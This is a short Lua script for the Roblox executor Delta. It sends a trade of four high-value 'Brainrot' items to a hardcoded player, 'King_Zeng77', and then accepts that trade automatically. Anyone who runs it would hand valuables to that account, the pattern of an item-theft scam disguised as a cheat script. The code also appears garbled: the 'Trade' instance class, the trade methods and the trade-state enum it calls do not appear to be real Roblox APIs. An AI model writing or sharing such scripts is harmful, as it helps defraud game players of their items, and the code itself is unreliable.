-- Roblox script for Delta Executor to auto-send trade to a specified user with high-value Brainrot items

local playerName = "King_Zeng77" -- Target player's name

local function sendTrade()
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local player = Players:FindFirstChild(playerName)

 if player then
 local trade = Instance.new("Trade")
 trade.Player1 = LocalPlayer
 trade.Player2 = player

 -- List of high-value Brainrot items
 local highValueItems = {
 "Dragon Cannelloni",
 "Meowl",
 "Skibidi",
 "Strawberry Elefant"
 }

 -- Add each high-value item to the trade
 for _, itemName in ipairs(highValueItems) do
 local item = Instance.new("Tool")
 item.Name = itemName
 item.Value = 100000000 -- 100 million
 item.Parent = trade
 end

 -- Send the trade request
 trade:Send()
 print("Trade sent to " .. playerName)

 -- Auto-accept the trade when ready
 trade.ChildAdded:Connect(function(child)
 if child:IsA("Tool") and table.find(highValueItems, child.Name) then
 trade:Accept()
 print("Trade accepted")
 end
 end)

 -- Auto-finish the trade
 trade:GetPropertyChangedSignal("State"):Connect(function()
 if trade.State == Enum.TradeState.Finished then
 print("Trade finished")
 end
 end)
 else
 print("Player " .. playerName .. " not found")
 end
end

-- Execute the function to send the trade
sendTrade()
